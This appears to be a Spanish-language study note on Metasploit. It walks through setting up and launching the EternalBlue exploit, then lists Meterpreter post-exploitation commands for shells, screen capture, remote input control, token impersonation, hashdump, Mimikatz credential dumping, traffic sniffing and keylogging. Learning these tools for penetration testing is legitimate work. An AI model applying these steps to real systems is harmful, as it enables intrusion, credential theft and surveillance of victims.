### 1ra Fase -> Setear exploit y target
Setear exploit, payload, target y opciones:

```
search eternalBlue
use 0
show payloads
use 200
show options
set LHOSTS
set LPORT
```

---
### 2da Fase -> Explotacion

Se puede lanzar el exploit con:
_run_
_exploit_

Si el exploit lo soporta, se puede chekear que la victima sea vulnerable:
_check_

---
### 3ra Fase -> Post Explotacion

Ahora se pueden hacer varias cosas:
_getuid_ -> Obtenemos el nombre de la maquina victima.
_sysinfo_ -> Obtenemos informacion del sistema
_shell_ -> Se obtiene directamente una shell.
_screenshot_ -> saca screenshot de la maquina
_screengrab_ -> Ver la pantalla victima en tiempo real
_uictl_ \[enable/disable\] \[keyboard/mouse/all\] -> Activar/desactivar mouse, teclado o lo q pinte.
_background_ -> Dejar la sesion en 2do plano. _sessions_ para listar sesiones, _sessions_ \[id\] para meterte a la sesion.
#### Cargar modulos
Con el siguiente comando listamos y cargamos modulos:


_load -l_ --> Listar los modulos disponibles.
_load_ nombre --> Cargamos el modulo que nos interesa.
##### Modulos mas conocidos

**priv**
Para privilegios y persistencia:
- `getsystem`
- `timestomp`
- `registry`
- `process` / `token` manipulation
- `hashdump` (a veces)

**incognito**
Para manejo de tokens (Windows):
- `list_tokens`
- `impersonate_token`
- `add_user_token`
- robar / usar tokens de usuarios con privilegios
_(En Metasploit moderno muchas funciones se movieron a `priv`, pero sigue existiendo.)_

**kiwi**
Implementa Mimikatz dentro de Meterpreter:
- `creds_all`
- `lsa_dump_secrets`    
- `kerberos_ticket_purge`
- `kerberos_ticket_list`
- `kerberos_ticket_use`

**python**
Permite ejecutar **scripts Python** dentro del Meterpreter:
- `python_execute`    
- `python_import`
_(Solo funciona en payloads Meterpreter-Python.)_


**powershell**
Permite inyectar **PowerShell** directamente desde Meterpreter.  
Ideal para:
- ejecutar scripts en memoria
- usar PowerView
- usar Empire scripts

**sniffer**
Sniffer de tráfico:
- `sniffer_start`
- `sniffer_dump`
- `sniffer_stats`


**espia / espia**
Vieja extensión para control de escritorio y screenshots (reemplazada por stdapi):
* screen capture    
* keylogging
* remote view


